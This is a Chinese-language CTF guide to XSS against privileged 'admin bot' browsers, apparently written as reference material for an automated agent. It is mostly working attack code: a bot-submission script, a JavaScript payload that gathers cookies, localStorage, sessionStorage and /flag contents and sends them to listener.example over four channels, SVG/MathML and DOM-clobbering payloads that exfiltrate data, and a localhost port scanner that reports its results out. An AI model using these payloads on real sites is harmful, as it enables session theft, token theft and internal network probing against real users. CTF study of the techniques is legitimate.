---
id: "ctf-website/07-client/admin-bot-xss"
title: "Admin Bot / XSS 实战"
title_en: "Admin Bot / XSS Practical Guide"
summary: >
  Admin Bot 题面的核心是让带高权限状态的浏览器访问可控页面，再按 CSP、cookie 属性、前端存储、同源 API、内网页面和 bot 行为差异选择外带或同源读取路线。本篇给出入口判定矩阵、外带通道选择器、bot 提交脚本、CSP gadget 选择、内网端口探测和 Evidence 模板。
summary_en: >
  Admin Bot challenges require driving a privileged browser to a controlled page and choosing exfiltration or same-origin read paths according to CSP, cookie attributes, frontend storage, same-origin APIs, internal pages, and bot behavior. Includes routing matrices, channel selectors, submission scripts, CSP gadget choices, internal probing, and evidence templates.
board: "ctf-website"
category: "07-client"
signals: ["XSS", "admin bot", "CSP bypass", "DOM clobbering", "跨站脚本", "exfiltration", "sanitizer bypass", "headless chrome"]
mcp_tools: ["http_probe", "kb_router", "jshook"]
keywords: ["XSS", "admin bot", "CSP绕过", "DOM Clobbering", "Sanitizer绕过", "Cookie窃取", "外带通道", "SVG XSS", "parser differential"]
difficulty: "advanced"
tags: ["xss", "client-side", "csp", "ctf", "browser"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["general/protocol/04-js-runtime-reversing", "ctf-website/07-client/postmessage", "ctf-website/02-auth/jwt/07-theft-replay"]
---
# Admin Bot / XSS 实战

Admin Bot 本质是一个带高权限状态的浏览器。`alert(1)` 只是入口，真正的目标是拿到 bot 才能访问的同源数据、前端状态、token、内部面板或 flag。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| 有 `/report`、`/submit`、`/visit` 让 bot 访问 URL | 枚举提交参数、等待时间、可访问协议 | bot 访问 listener，带 HeadlessChrome UA | 只做服务端 URL 抓取，不执行 JS |
| 反射/存储 HTML 注入 | 先测 parser 与 sanitizer，再测外带通道 | payload 在 bot 环境触发 listener | 用户浏览器触发，bot 不触发 |
| Cookie 为 HttpOnly | 走同源 fetch 读 `/flag`、`/api/me`、`/admin` | fetch 响应可外带 | CORS/Origin/CSRF 阻断同源状态 |
| token 在 localStorage/sessionStorage | 注入运行时快照 | JWT/access_token 可重放 | token 只用于 UI，API 依赖 cookie |
| CSP 存在 | 按 `connect-src/img-src/form-action/script-src` 路由 | 至少一个外带通道被允许 | 所有外链被拦，转 same-origin sink |
| bot 可能有内网视角 | 端口/路径时间差探测 | 127.0.0.1 或内网服务响应差异 | bot 网络与公网一致 |

## 工作流

```text
确认 bot 会执行 JS
  → 读取 CSP/cookie/storage/API baseline
  → 选择外带通道或同源读取
  → 构造最短 payload
  → 提交给 bot 并等待 listener
  → 按响应推进 JWT、CSRF、内网或 postMessage 链
```

## 0. 判定矩阵

| 约束 | 首选路线 | 备选路线 |
|---|---|---|
| `connect-src` 允许外域 | `fetch/sendBeacon/WebSocket` | image/form |
| 只允许 `img-src` | image beacon、DNS label | 同源缓存写入后读 |
| 只允许 `form-action` | 隐藏表单 POST | `window.name` 中转 |
| `script-src` 禁 inline | SVG/MathML/gadget/DOM clobbering | 存储型页面二跳 |
| Cookie HttpOnly | 同源 API 读取后外带响应 | CSRF 动作 + 状态差分 |
| 无外带域 | same-origin 写入可读位置 | 把 flag 放入 profile/comment/log 再读 |

## 1. Bot 提交器

```python
#!/usr/bin/env python3
import argparse
import json
import requests

def submit(url, target, mode):
    if mode == "json":
        return requests.post(url, json={"url": target}, timeout=10)
    if mode == "graphql":
        return requests.post(url, json={"query": f'mutation{{visit(url:"{target}"){{ok}}}}'}, timeout=10)
    return requests.post(url, data={"url": target}, timeout=10)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--submit-url", required=True)
    ap.add_argument("--target-url", required=True)
    ap.add_argument("--mode", choices=["form", "json", "graphql"], default="form")
    args = ap.parse_args()
    r = submit(args.submit_url, args.target_url, args.mode)
    print(json.dumps({"status": r.status_code, "location": r.headers.get("Location", ""), "body": r.text[:500]}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：提交后 listener 收到 bot 访问，或目标队列返回 visit id。失败样本：只返回 URL syntax error、协议被过滤、队列存在但 listener 没有访问。

## 2. 外带通道选择器

```javascript
(() => {
  const L = "https://listener.example/collect";
  const pack = async () => {
    let same = "";
    try {
      same = await fetch("/flag", {credentials: "include"}).then(r => r.text());
    } catch (e) {
      same = String(e);
    }
    return btoa(unescape(encodeURIComponent(JSON.stringify({
      href: location.href,
      cookie: document.cookie,
      local: {...localStorage},
      session: {...sessionStorage},
      same: same.slice(0, 1200)
    }))).replace(/=+$/, "");
  };
  pack().then(d => {
    navigator.sendBeacon && navigator.sendBeacon(L, d);
    fetch(L + "?f=" + d, {mode: "no-cors"}).catch(() => {});
    (new Image()).src = L + "/i/" + d.slice(0, 1800);
    const f = document.createElement("form");
    f.method = "POST"; f.action = L; f.target = "_self";
    const i = document.createElement("input"); i.name = "d"; i.value = d;
    f.appendChild(i); document.body.appendChild(f);
    setTimeout(() => f.submit(), 50);
  });
})();
```

判定：

| listener 现象 | 解释 |
|---|---|
| fetch/sendBeacon 到达 | `connect-src` 可用，继续读同源 API |
| 只有 image 到达 | `img-src` 可用，分片外带 |
| 只有 form 到达 | `form-action` 可用，用 POST 带长响应 |
| 都不到达 | CSP/网络阻断，转同源写入或 DNS label |

## 3. CSP 与 gadget 选择

| CSP 形态 | Payload 族 |
|---|---|
| `script-src 'unsafe-inline'` | 直接 `<script>` 或事件处理器 |
| `script-src 'self'` | 找同源 JSONP、Angular/React/Vue gadget、上传 JS |
| `img-src *` | image beacon 外带 |
| `connect-src *` | fetch/WebSocket 外带 |
| `base-uri` 缺失 | `<base href>` 改相对资源加载 |
| `trusted-types` 存在 | 找已有 policy 或 DOM sink 二跳 |

```html
<svg><animate attributeName="x" onbegin="fetch('/flag',{credentials:'include'}).then(r=>r.text()).then(t=>location='https://listener.example/?d='+btoa(t))"></animate></svg>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror="fetch('/flag').then(r=>r.text()).then(t=>new Image().src='https://listener.example/i?d='+btoa(t))">-->
```

## 4. DOM Clobbering 与同源动作

当脚本不可直接执行但 HTML 可注入时，优先影响目标代码已经读取的全局变量、form、anchor、config。

```html
<form id=config><input name=isAdmin value=true><input name=apiBase value=/admin></form>
<a id=redirect_uri href="javascript:fetch('/flag').then(r=>r.text()).then(t=>location='https://listener.example/?d='+btoa(t))"></a>
<iframe name=csrf_token srcdoc="<input id=x value=owned>"></iframe>
```

## 5. 内网与同源探测

```javascript
async function probe() {
  const ports = [80, 443, 3000, 5000, 6379, 8000, 8080, 9222];
  const out = [];
  for (const p of ports) {
    const t0 = performance.now();
    try {
      await fetch(`http://127.0.0.1:${p}/`, {mode: "no-cors", cache: "no-store"});
      out.push({port: p, dt: Math.round(performance.now() - t0), hit: true});
    } catch (e) {
      out.push({port: p, dt: Math.round(performance.now() - t0), hit: false});
    }
  }
  new Image().src = "https://listener.example/p?" + btoa(JSON.stringify(out));
}
probe();
```

成功样本：端口时间差稳定、同源 API 响应被外带、flag/token 到达 listener。失败样本：listener 无访问、只有普通用户访问、bot 不执行脚本、同源 fetch body 为空。

## 攻击链

```text
XSS 注入
  → bot 执行 JS
  → 读取同源 /flag 或前端 token
  → 选择可用外带通道
  → listener 收到响应
  → JWT 重放 / CSRF 动作 / 内网探测 / postMessage 二跳
```

## Evidence

| 项 | 记录内容 |
|---|---|
| bot 触发 | 提交 URL、队列响应、listener 时间、UA、IP、Referer |
| 注入点 | URL、参数、payload、渲染上下文、sanitizer 输出 |
| CSP 路由 | CSP header/meta、可用外带通道、失败通道 |
| 同源读取 | 被读取路径、状态码、响应 hash、关键字段 |
| 成功样本 | flag/token/admin 数据到达 listener，或同源动作产生状态变化 |
| 失败样本 | CSP 拦截、bot 不执行 JS、cookie 不随请求、响应 hash 固定拒绝 |
| 下一跳 | token 转 JWT 07；postMessage 转本目录 postmessage；内网转 SSRF/infra |

## MCP 工具映射

| 步骤 | MCP 工具 | 说明 |
|---|---|---|
| 入口探测 | `http_probe` | 探测注入点、CSP、bot 提交接口 |
| 浏览器打点 | `jshook` | 注入 fetch/XHR/storage hook |
| 知识路由 | `kb_router` | 按 XSS、CSP、admin bot、DOM clobbering 信号搜索 |
